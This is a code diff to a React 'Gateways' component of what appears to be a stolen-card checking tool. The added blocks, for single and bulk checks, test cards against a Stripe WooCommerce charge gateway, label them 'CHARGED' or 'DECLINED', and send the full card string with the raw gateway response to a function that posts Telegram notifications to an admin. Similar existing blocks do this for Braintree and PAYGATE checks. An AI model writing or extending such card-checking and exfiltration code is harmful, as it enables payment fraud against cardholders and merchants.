@@ -1373,6 +1373,27 @@ const Gateways = () => {
         }
       }
 
+      // Send Telegram notification for Stripe Charge WOO checks (with raw response to admin)
+      if (selectedGateway.id === "stripe_charge_woo" && gatewayResponse && checkStatus !== "unknown") {
+        try {
+          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
+          
+          await supabase.functions.invoke('notify-charged-card', {
+            body: {
+              user_id: userId,
+              card_details: fullCardString,
+              status: checkStatus === "live" ? "CHARGED" : "DECLINED",
+              response_message: realResponseMessage,
+              amount: gatewayResponse.apiTotal || "$12.45",
+              gateway: "stripe_charge_woo",
+              api_response: gatewayResponse.rawResponse
+            }
+          });
+        } catch (notifyError) {
+          console.log("Failed to send Telegram notification:", notifyError);
+        }
+      }
+
       // Send Telegram notification for B3 checks (LIVE ONLY - user requested no declined cards)
       if (selectedGateway.id === "braintree_auth" && gatewayResponse && checkStatus === "live") {
         try {
@@ -2152,6 +2173,27 @@ const Gateways = () => {
                 response_message: realResponseMessage,
                 amount: gatewayResponse.apiTotal || "$14.00",
                 gateway: "PAYGATE",
+                api_response: gatewayResponse.rawResponse
+              }
+            });
+          } catch (notifyError) {
+            console.log("Failed to send Telegram notification:", notifyError);
+          }
+        }
+
+        // Send Telegram notification for Stripe Charge WOO checks (with raw response to admin) in bulk
+        if (selectedGateway.id === "stripe_charge_woo" && gatewayResponse && checkStatus !== "unknown") {
+          try {
+            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
+            
+            await supabase.functions.invoke('notify-charged-card', {
+              body: {
+                user_id: userId,
+                card_details: fullCardStr,
+                status: checkStatus === "live" ? "CHARGED" : "DECLINED",
+                response_message: realResponseMessage,
+                amount: gatewayResponse.apiTotal || "$12.45",
+                gateway: "stripe_charge_woo",
                 api_response: gatewayResponse.rawResponse
               }
             });
